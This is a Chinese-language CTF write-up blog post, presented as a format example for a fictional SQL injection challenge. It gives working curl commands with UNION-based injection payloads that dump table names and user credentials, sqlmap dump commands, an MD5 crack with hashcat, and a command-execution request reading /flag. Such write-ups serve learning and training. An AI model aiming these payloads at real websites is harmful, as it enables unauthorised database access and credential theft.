---
title: 示例 WriteUp：一道 SQL 注入题从信息收集到拿 Flag
date: 2026-10-12 21:00:00
updated: 2026-10-12 21:00:00
description: 用一道典型 SQL 注入题演示 WriteUp 的记录格式（示例内容，非真实题目）
cover: 
top_img: 
sticky: 1
tags:
  - CTF
  - Web
  - SQL注入
  - sqlmap
categories:
  - WriteUp
keywords: SQL注入,CTF,Web,union,writeup
---

> 这是一篇**格式示例**，演示我会怎么记录一道 Web 题。题目内容是虚构的。

## 一、题目信息

| 项目 | 内容 |
|---|---|
| 平台 / 比赛 | 示例 CTF 线上赛 |
| 题目名称 | EasySQL |
| 类型 | Web |
| 难度 | 简单 |
| 靶机地址 | `http://challenge.example.com:8080` |

## 二、信息收集

先看页面功能，发现一个查询框，参数是 `?id=1`：

```bash
curl -s "http://challenge.example.com:8080/?id=1"
```

目录扫一下：

```bash
dirsearch -u http://challenge.example.com:8080 -e php,txt,bak
```

发现 `/backup.sql.bak`，泄露了表结构：

```sql
CREATE TABLE users(id INT, username VARCHAR(64), password VARCHAR(64));
```

## 三、漏洞分析与利用

### 3.1 判断注入类型

```bash
# 加单引号报错 → 存在字符型/数字型注入
curl -s "http://challenge.example.com:8080/?id=1'"
# 1' and '1'='1 正常，1' and '1'='2 异常 → 确认字符型注入
```

### 3.2 判断字段数

```bash
curl -s "http://challenge.example.com:8080/?id=1' order by 3-- -"
curl -s "http://challenge.example.com:8080/?id=1' order by 4-- -"   # 报错 → 3 个字段
```

### 3.3 UNION 注入拿数据

```bash
curl -s "http://challenge.example.com:8080/?id=-1' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()-- -"
curl -s "http://challenge.example.com:8080/?id=-1' union select 1,group_concat(username,0x3a,password),3 from users-- -"
```

拿到管理员密码的 MD5，扔进在线库或本地解：

```bash
hashcat -m 0 5f4dcc3b5aa765d61d8327deb882cf99 /usr/share/wordlists/rockyou.txt
```

### 3.4 顺手用 sqlmap 复核

```bash
sqlmap -u "http://challenge.example.com:8080/?id=1" --batch --dbs
sqlmap -u "http://challenge.example.com:8080/?id=1" -D ctf -T users --dump
```

## 四、拿 Flag

后台登录后用 `?cmd=` 的命令执行点读到 flag：

```bash
curl -s "http://challenge.example.com:8080/admin.php?cmd=cat%20/flag"
```

```text
flag{un10n_1nj3ct10n_1s_e4sy}
```

## 五、踩坑与总结

- `order by` 用 `-- -` 注释时，**减号后面必须跟空格**，否则 MySQL 会把 `--` 当运算
- UNION 注入要先把前面的查询**置空**（`id=-1`），否则只回显第一条结果
- sqlmap 测不出来时可以手动 `--technique=U` 指定 union 技术
- 备份文件泄露（`.bak`、`.zip`、`.git`）是最常见的低垂果实，扫目录别偷懒

## 六、参考

- [SQL 注入基础 - PortSwigger](https://portswigger.net/web-security/sql-injection)
- [sqlmap 官方文档](https://github.com/sqlmapproject/sqlmap/wiki)
